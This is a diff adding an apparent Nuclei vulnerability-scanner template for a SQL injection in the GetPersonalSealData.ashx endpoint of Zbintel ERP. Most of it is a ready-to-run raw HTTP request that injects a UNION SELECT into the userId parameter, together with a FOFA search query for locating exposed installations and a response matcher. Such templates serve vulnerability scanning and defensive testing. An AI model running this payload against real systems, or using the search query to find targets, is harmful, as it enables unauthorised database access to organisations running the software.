@@ -1,0 +1,32 @@
+id: Zbintel-ERP-GetPersonalSealData_SQL_injected
+
+info:
+  name: Zbintel-ERP-GetPersonalSealData_SQL_injected
+  author: HK
+  severity: high
+  description: 智邦国际ERP/SYSN/json/pcclient/GetPersonalSealData.ashx接口存在SQL注入漏洞
+  metadata:
+    max-request: 1
+    Fofa-query: body="sysn/view/init/default.ashx"
+    verified: true
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - SealData  
